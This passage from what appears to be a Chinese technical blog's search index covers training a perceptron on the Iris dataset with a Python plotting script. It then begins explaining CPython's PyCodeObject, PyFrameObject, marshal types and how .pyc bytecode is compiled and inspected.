href=\"#Iris数据集训练感知机算法\" class=\"headerlink\" title=\"Iris数据集训练感知机算法\"></a>Iris数据集训练感知机算法</h2><h3 id=\"数据集\"><a href=\"#数据集\" class=\"headerlink\" title=\"数据集\"></a>数据集</h3><p>使用UCI机器学习数据库提供的Iris数据集, UCI网址: <a href=\"http://archive.ics.uci.edu/ml/\" target=\"_blank\" rel=\"noopener\">http://archive.ics.uci.edu/ml/</a>, UCI机器学习库包含超过350个数据集，其标签分类包括域、目的（分类、回归）。</p>\n<p>以Iris为例介绍一下数据集：</p>\n<p>ucidata/iris中有三个文件：<code>Index</code>, <code>iris.data</code>, <code>iris.names</code></p>\n<p><code>index</code>为文件夹目录，列出了本文件夹里的所有文件</p>\n<p><code>iris.data</code>为iris数据文件，内容如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">5.1,3.5,1.4,0.2,Iris-setosa</span><br><span class=\"line\">4.9,3.0,1.4,0.2,Iris-setosa</span><br><span class=\"line\">……</span><br><span class=\"line\">7.0,3.2,4.7,1.4,Iris-versicolor</span><br><span class=\"line\">6.4,3.2,4.5,1.5,Iris-versicolor</span><br><span class=\"line\">……</span><br><span class=\"line\">6.3,3.3,6.0,2.5,Iris-virginica</span><br><span class=\"line\">5.8,2.7,5.1,1.9,Iris-virginica</span><br><span class=\"line\">7.1,3.0,5.9,2.1,Iris-virginica</span><br></pre></td></tr></table></figure>\n<p>如上，属性直接以逗号隔开，中间没有空格（5.1,3.5,1.4,0.2,），最后一列为本行属性对应的值，即决策属性Iris-setosa</p>\n<p><code>iris.names</code>介绍了irir数据的一些相关信息，如数据标题、数据来源、以前使用情况、最近信息、实例数目、实例的属性等，如下所示部分：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">……</span><br><span class=\"line\">Attribute Information:</span><br><span class=\"line\"></span><br><span class=\"line\">1. sepal length in cm</span><br><span class=\"line\">2. sepal width in cm</span><br><span class=\"line\">3. petal length in cm</span><br><span class=\"line\">4. petal width in cm</span><br><span class=\"line\">5. class:</span><br><span class=\"line\">    -- Iris Setosa</span><br><span class=\"line\">    -- Iris Versicolour</span><br><span class=\"line\">    -- Iris Virginica</span><br></pre></td></tr></table></figure>\n<h3 id=\"训练\"><a href=\"#训练\" class=\"headerlink\" title=\"训练\"></a>训练</h3><p>我们仅使用Iris中Setosa和Versicolor两种花的数据，抽取出前100条样本，这正好是Setosa和Versicolor对应的样本，我们将Versicolor对应的数据作为类别1，Setosa对应的作为-1。对于特征，我们抽取出sepal length和petal length两维度特征。</p>\n<ul>\n<li>test.py</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">@author: janes</span></span><br><span class=\"line\"><span class=\"string\">@file: perceptron.py</span></span><br><span class=\"line\"><span class=\"string\">@time: 2017/4/7 13:45</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"><span class=\"keyword\">from</span> matplotlib.colors <span class=\"keyword\">import</span> ListedColormap</span><br><span class=\"line\"><span class=\"keyword\">import</span> pandas <span class=\"keyword\">as</span> pd</span><br><span class=\"line\"><span class=\"keyword\">from</span> perceptron <span class=\"keyword\">import</span> Perceptron</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">plot_x</span><span class=\"params\">(X)</span>:</span></span><br><span class=\"line\">    plt.scatter(X[:<span class=\"number\">50</span>, <span class=\"number\">0</span>], X[:<span class=\"number\">50</span>, <span class=\"number\">1</span>], color=<span class=\"string\">'red'</span>, marker=<span class=\"string\">'o'</span>, label=<span class=\"string\">'setosa'</span>)</span><br><span class=\"line\">    plt.scatter(X[<span class=\"number\">50</span>:, <span class=\"number\">0</span>], X[<span class=\"number\">50</span>:, <span class=\"number\">1</span>], color=<span class=\"string\">'blue'</span>, marker=<span class=\"string\">'x'</span>, label=<span class=\"string\">'versicolor'</span>)</span><br><span class=\"line\">    plt.xlabel(<span class=\"string\">'petal length'</span>)</span><br><span class=\"line\">    plt.ylabel(<span class=\"string\">'sepal length'</span>)</span><br><span class=\"line\">    plt.legend(loc=<span class=\"string\">'upper left'</span>)</span><br><span class=\"line\">    plt.show()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">plot_decision_region</span><span class=\"params\">(X, y, classifier, resolution=<span class=\"number\">0.02</span>)</span>:</span></span><br><span class=\"line\">    markers = (<span class=\"string\">'s'</span>, <span class=\"string\">'x'</span>, <span class=\"string\">'o'</span>, <span class=\"string\">'^'</span>, <span class=\"string\">'v'</span>)</span><br><span class=\"line\">    colors = (<span class=\"string\">'red'</span>, <span class=\"string\">'blue'</span>, <span class=\"string\">'lightgreen'</span>, <span class=\"string\">'gray'</span>, <span class=\"string\">'cyan'</span>)</span><br><span class=\"line\">    cmap = ListedColormap(colors[:len(np.unique(y))])</span><br><span class=\"line\"></span><br><span class=\"line\">    x1_min, x1_max = X[:, <span class=\"number\">0</span>].min()<span class=\"number\">-1</span>, X[:, <span class=\"number\">0</span>].max() + <span class=\"number\">1</span></span><br><span class=\"line\">    x2_min, x2_max = X[:, <span class=\"number\">1</span>].min()<span class=\"number\">-1</span>, X[:, <span class=\"number\">1</span>].max() + <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">    xx1, xx2 = np.meshgrid(np.arange(x1_min, x1_max, resolution),</span><br><span class=\"line\">                           np.arange(x2_min, x2_max, resolution))</span><br><span class=\"line\">    Z = classifier.predict(np.array([xx1.ravel(), xx2.ravel()]).T)</span><br><span class=\"line\">    Z = Z.reshape(xx1.shape)</span><br><span class=\"line\"></span><br><span class=\"line\">    plt.contourf(xx1, xx2, Z, alpha=<span class=\"number\">0.4</span>, cmap=cmap)</span><br><span class=\"line\">    plt.xlim(xx1.min(), xx1.max())</span><br><span class=\"line\">    plt.ylim(xx2.min(), xx2.max())</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> idx, cl <span class=\"keyword\">in</span> enumerate(np.unique(y)):</span><br><span class=\"line\">        plt.scatter(x=X[y == cl, <span class=\"number\">0</span>], y=X[y == cl, <span class=\"number\">1</span>], alpha=<span class=\"number\">0.8</span>, c=cmap(idx),</span><br><span class=\"line\">                    marker=markers[idx], label=cl)</span><br><span class=\"line\"></span><br><span class=\"line\">    plt.xlabel(<span class=\"string\">'sepal length [cm]'</span>)</span><br><span class=\"line\">    plt.ylabel(<span class=\"string\">'petal length [cm]'</span>)</span><br><span class=\"line\">    plt.show()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">plot_misclassifications</span><span class=\"params\">(classifier)</span>:</span></span><br><span class=\"line\">    plt.plot(range(<span class=\"number\">1</span>, len(classifier.errors_)+<span class=\"number\">1</span>), classifier.errors_, marker=<span class=\"string\">'o'</span>)</span><br><span class=\"line\">    plt.xlabel(<span class=\"string\">'Epoches'</span>)</span><br><span class=\"line\">    plt.ylabel(<span class=\"string\">'Numebr of misclassifications'</span>)</span><br><span class=\"line\">    plt.show()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\">    df = pd.read_csv(<span class=\"string\">'iris.data.csv'</span>, header=<span class=\"keyword\">None</span>)</span><br><span class=\"line\">    y = df.iloc[<span class=\"number\">0</span>:<span class=\"number\">100</span>, <span class=\"number\">4</span>].values</span><br><span class=\"line\">    y = np.where(y == <span class=\"string\">'Iris-setosa'</span>, <span class=\"number\">-1</span>, <span class=\"number\">1</span>)</span><br><span class=\"line\">    X = df.iloc[<span class=\"number\">0</span>:<span class=\"number\">100</span>, [<span class=\"number\">0</span>, <span class=\"number\">2</span>]].values</span><br><span class=\"line\"></span><br><span class=\"line\">    ppn = Perceptron(eta=<span class=\"number\">0.1</span>, n_iter=<span class=\"number\">10</span>)</span><br><span class=\"line\">    ppn.fit(X, y)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># plot_x(X)</span></span><br><span class=\"line\">    <span class=\"comment\"># plot_misclassifications(ppn)</span></span><br><span class=\"line\">    plot_decision_region(X, y, ppn)</span><br></pre></td></tr></table></figure>\n<img src=\"/2017/04/07/Iris数据集训练感知机模型/predict.png\">\n<p>虽然对于Iris数据集，感知机算法表现的很完美，但是”收敛”一直是感知机算法中的一大问题。Frank Rosenblatt从数学上证明了只要两个类别能够被一个现行超平面分开，则感知机算法一定能够收敛。然而，如果数据并非线性可分，感知计算法则会一直运行下去，除非我们人为设置最大迭代次数n_iter</p>\n<h2 id=\"reference\"><a href=\"#reference\" class=\"headerlink\" title=\"reference\"></a>reference</h2><ul>\n<li><a href=\"https://ljalphabeta.gitbooks.io/python-/content/ch2section3.html\" target=\"_blank\" rel=\"noopener\">https://ljalphabeta.gitbooks.io/python-/content/ch2section3.html</a></li>\n</ul>\n","categories":["机器学习"],"tags":["感知机"]},{"title":"PyCodeObject和opcode","url":"http://www.beesfun.com/2017/04/01/PyCodeObject和opcode/","content":"<h2 id=\"pyc文件\"><a href=\"#pyc文件\" class=\"headerlink\" title=\"pyc文件\"></a>pyc文件</h2><p>Python的原始代码在运行前都会被先编译成字节码，并把编译的结果保存到一个一个的PyCodeObject中，把PyCodeObject从内存中以marshal格式保存为文件，即pyc文件。python 内置库<code>dis</code>，可以把二进制反编译CPython bytecode。二进制对应的bytecode可以参考: <a href=\"https://github.com/python/cpython/blob/2.7/Include/opcode.h\" target=\"_blank\" rel=\"noopener\">https://github.com/python/cpython/blob/2.7/Include/opcode.h</a> ,其中bytecode所代表的意义:<a href=\"https://docs.python.org/2/library/dis.html\" target=\"_blank\" rel=\"noopener\">https://docs.python.org/2/library/dis.html</a></p>\n<a id=\"more\"></a>\n<h2 id=\"PyCodeObject\"><a href=\"#PyCodeObject\" class=\"headerlink\" title=\"PyCodeObject\"></a>PyCodeObject</h2><p>Python代码中Code.h中定义的PyCodeObject结构</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* Bytecode object */</span>  </span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span>  </span><br><span class=\"line\">    PyObject_HEAD  </span><br><span class=\"line\">    <span class=\"keyword\">int</span> co_argcount;        <span class=\"comment\">/* #arguments, except *args */</span>  </span><br><span class=\"line\">    <span class=\"keyword\">int</span> co_nlocals;     <span class=\"comment\">/* #local variables */</span>  </span><br><span class=\"line\">    <span class=\"keyword\">int</span> co_stacksize;       <span class=\"comment\">/* #entries needed for evaluation stack */</span>  </span><br><span class=\"line\">    <span class=\"keyword\">int</span> co_flags;       <span class=\"comment\">/* CO_..., see below */</span>  </span><br><span class=\"line\">    PyObject *co_code;      <span class=\"comment\">/* instruction opcodes */</span>  </span><br><span class=\"line\">    PyObject *co_consts;    <span class=\"comment\">/* list (constants used) */</span>  </span><br><span class=\"line\">    PyObject *co_names;     <span class=\"comment\">/* list of strings (names used) */</span>  </span><br><span class=\"line\">    PyObject *co_varnames;  <span class=\"comment\">/* tuple of strings (local variable names) */</span>  </span><br><span class=\"line\">    PyObject *co_freevars;  <span class=\"comment\">/* tuple of strings (free variable names) */</span>  </span><br><span class=\"line\">    PyObject *co_cellvars;      <span class=\"comment\">/* tuple of strings (cell variable names) */</span>  </span><br><span class=\"line\">    <span class=\"comment\">/* The rest doesn't count for hash/cmp */</span>  </span><br><span class=\"line\">    PyObject *co_filename;  <span class=\"comment\">/* string (where it was loaded from) */</span>  </span><br><span class=\"line\">    PyObject *co_name;      <span class=\"comment\">/* string (name, for reference) */</span>  </span><br><span class=\"line\">    <span class=\"keyword\">int</span> co_firstlineno;     <span class=\"comment\">/* first source line number */</span>  </span><br><span class=\"line\">    PyObject *co_lnotab;    <span class=\"comment\">/* string (encoding addr&lt;-&gt;lineno mapping) See</span></span><br><span class=\"line\"><span class=\"comment\">                   Objects/lnotab_notes.txt for details. */</span>  </span><br><span class=\"line\">    <span class=\"keyword\">void</span> *co_zombieframe;     <span class=\"comment\">/* for optimization only (see frameobject.c) */</span>  </span><br><span class=\"line\">    PyObject *co_weakreflist;   <span class=\"comment\">/* to support weakrefs to code objects */</span>  </span><br><span class=\"line\">&#125; PyCodeObject;</span><br></pre></td></tr></table></figure>\n<p>各字段的意义:</p>\n<ul>\n<li>argcount：参数的个数</li>\n<li>nlocals：局部变量的个数（包含参数在内）</li>\n<li>stacksize：堆栈的大小</li>\n<li>flags：用来表示参数中是否有<code>*args</code>或者 <code>**kwargs</code></li>\n<li>code：字节码</li>\n<li>names：全局变量，函数，类，类的方法的名称</li>\n<li>varnames：局部变量的名称（包含参数）</li>\n<li>consts：一个常量表，在marshal.c中有定义所有的类型</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> TYPE_NULL               <span class=\"meta-string\">'0'</span>  </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> TYPE_NONE               <span class=\"meta-string\">'N'</span>  </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> TYPE_FALSE              <span class=\"meta-string\">'F'</span>  </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> TYPE_TRUE               <span class=\"meta-string\">'T'</span>  </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> TYPE_STOPITER           <span class=\"meta-string\">'S'</span>  </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> TYPE_ELLIPSIS           <span class=\"meta-string\">'.'</span>  </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> TYPE_INT                <span class=\"meta-string\">'i'</span>  </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> TYPE_INT64              <span class=\"meta-string\">'I'</span>  </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> TYPE_FLOAT              <span class=\"meta-string\">'f'</span>  </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> TYPE_BINARY_FLOAT       <span class=\"meta-string\">'g'</span>  </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> TYPE_COMPLEX            <span class=\"meta-string\">'x'</span>  </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> TYPE_BINARY_COMPLEX     <span class=\"meta-string\">'y'</span>  </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> TYPE_LONG               <span class=\"meta-string\">'l'</span>  </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> TYPE_STRING             <span class=\"meta-string\">'s'</span>  </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> TYPE_INTERNED           <span class=\"meta-string\">'t'</span>  </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> TYPE_STRINGREF          <span class=\"meta-string\">'R'</span>  </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> TYPE_TUPLE              <span class=\"meta-string\">'('</span>  </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> TYPE_LIST               <span class=\"meta-string\">'['</span>  </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> TYPE_DICT               <span class=\"meta-string\">'&#123;'</span>  </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> TYPE_CODE               <span class=\"meta-string\">'c'</span>  </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> TYPE_UNICODE            <span class=\"meta-string\">'u'</span>  </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> TYPE_UNKNOWN            <span class=\"meta-string\">'?'</span>  </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> TYPE_SET                <span class=\"meta-string\">'&lt;'</span>  </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> TYPE_FROZENSET          <span class=\"meta-string\">'&gt;'</span></span></span><br></pre></td></tr></table></figure>\n<p>所有的PyCodeObject都是通过调用以下的函数得以运行的：<code>PyObject * PyEval_EvalFrameEx(PyFrameObject *f, int throwflag)</code>, 这个函数是Python的一个重量极的函数，它的作用即是执行中间码，Python的代码都是通过调用这个函数来运行的</p>\n<p>PyFrameObject这个数据结构：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">frame</span> &#123;</span>  </span><br><span class=\"line\">    PyObject_VAR_HEAD  </span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">frame</span> *<span class=\"title\">f_back</span>;</span>  <span class=\"comment\">/* previous frame, or NULL */</span>  </span><br><span class=\"line\">    PyCodeObject *f_code;   <span class=\"comment\">/* code segment */</span>  </span><br><span class=\"line\">    PyObject *f_builtins;   <span class=\"comment\">/* builtin symbol table (PyDictObject) */</span>  </span><br><span class=\"line\">    PyObject *f_globals;    <span class=\"comment\">/* global symbol table (PyDictObject) */</span>  </span><br><span class=\"line\">    PyObject *f_locals;     <span class=\"comment\">/* local symbol table (any mapping) */</span>  </span><br><span class=\"line\">    PyObject **f_valuestack;    <span class=\"comment\">/* points after the last local */</span>  </span><br><span class=\"line\">    <span class=\"comment\">/* Next free slot in f_valuestack.  Frame creation sets to f_valuestack.</span></span><br><span class=\"line\"><span class=\"comment\">       Frame evaluation usually NULLs it, but a frame that yields sets it</span></span><br><span class=\"line\"><span class=\"comment\">       to the current stack top. */</span>  </span><br><span class=\"line\">    PyObject **f_stacktop;  </span><br><span class=\"line\">    PyObject *f_trace;      <span class=\"comment\">/* Trace function */</span>  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* If an exception is raised in this frame, the next three are used to</span></span><br><span class=\"line\"><span class=\"comment\">     * record the exception info (if any) originally in the thread state.  See</span></span><br><span class=\"line\"><span class=\"comment\">     * comments before set_exc_info() -- it's not obvious.</span></span><br><span class=\"line\"><span class=\"comment\">     * Invariant:  if _type is NULL, then so are _value and _traceback.</span></span><br><span class=\"line\"><span class=\"comment\">     * Desired invariant:  all three are NULL, or all three are non-NULL.  That</span></span><br><span class=\"line\"><span class=\"comment\">     * one isn't currently true, but \"should be\".</span></span><br><span class=\"line\"><span class=\"comment\">     */</span>  </span><br><span class=\"line\">    PyObject *f_exc_type, *f_exc_value, *f_exc_traceback;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    PyThreadState *f_tstate;  </span><br><span class=\"line\">    <span class=\"keyword\">int</span> f_lasti;        <span class=\"comment\">/* Last instruction if called */</span>  </span><br><span class=\"line\">    <span class=\"comment\">/* Call PyFrame_GetLineNumber() instead of reading this field</span></span><br><span class=\"line\"><span class=\"comment\">       directly.  As of 2.3 f_lineno is only valid when tracing is</span></span><br><span class=\"line\"><span class=\"comment\">       active (i.e. when f_trace is set).  At other times we use</span></span><br><span class=\"line\"><span class=\"comment\">       PyCode_Addr2Line to calculate the line from the current</span></span><br><span class=\"line\"><span class=\"comment\">       bytecode index. */</span>  </span><br><span class=\"line\">    <span class=\"keyword\">int</span> f_lineno;       <span class=\"comment\">/* Current line number */</span>  </span><br><span class=\"line\">    <span class=\"keyword\">int</span> f_iblock;       <span class=\"comment\">/* index in f_blockstack */</span>  </span><br><span class=\"line\">    PyTryBlock f_blockstack[CO_MAXBLOCKS]; <span class=\"comment\">/* for try and loop blocks */</span>  </span><br><span class=\"line\">    PyObject *f_localsplus[<span class=\"number\">1</span>];  <span class=\"comment\">/* locals+stack, dynamically sized */</span>  </span><br><span class=\"line\">&#125; PyFrameObject;</span><br></pre></td></tr></table></figure>\n<p>重点关注下以下的成员：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PyObject **f_stacktop;  </span><br><span class=\"line\"></span><br><span class=\"line\">PyCodeObject *f_code;   <span class=\"comment\">/* code segment */</span>  </span><br><span class=\"line\">PyObject *f_globals;    <span class=\"comment\">/* global symbol table (PyDictObject) */</span>  </span><br><span class=\"line\">PyObject *f_locals;     <span class=\"comment\">/* local symbol table (any mapping) */</span></span><br></pre></td></tr></table></figure>\n<p>可见PyFrameObject中包含一个PyCodeObject的结构体指针f_code,PyFrameObject中的f_globals和f_locals这两个dict对象分别用于保存全局对象和局部对象，可以说，PyFrameObject结构就是PyCodeObject的运行环境，PyCodeObject结构是静态的，创建以后就一般不会再变，而PyFrameObject则是动态的，在创建以后,f_globals和f_locals这两个dict都经常会发生变化，并且一个PyCodeObject可能对应好几个的PyFrameObject中。</p>\n<h2 id=\"实例演示\"><a href=\"#实例演示\" class=\"headerlink\" title=\"实例演示\"></a>实例演示</h2><ul>\n<li>新建test.py</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> dis  </span><br><span class=\"line\">myglobal = <span class=\"keyword\">True</span>  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(a)</span>:</span>  </span><br><span class=\"line\">    b = <span class=\"number\">1</span>  </span><br><span class=\"line\">    a += b  </span><br><span class=\"line\">    <span class=\"keyword\">return</span> a  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">world</span>:</span>  </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self)</span>:</span>  </span><br><span class=\"line\">        <span class=\"keyword\">pass</span>  </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">sayHello</span><span class=\"params\">(self)</span>:</span>  </span><br><span class=\"line\">        <span class=\"keyword\">print</span> <span class=\"string\">'hello,world'</span>  </span><br><span class=\"line\"></span><br><span class=\"line\">w = world()  </span><br><span class=\"line\">w.sayHello()</span><br></pre></td></tr></table></figure>\n<ul>\n<li>编译成pyc</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -m compileall test.py</span><br></pre></td></tr></table></figure>\n<ul>\n<li>分析test.pyc</li>\n</ul>\n<p>showfile.py</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span 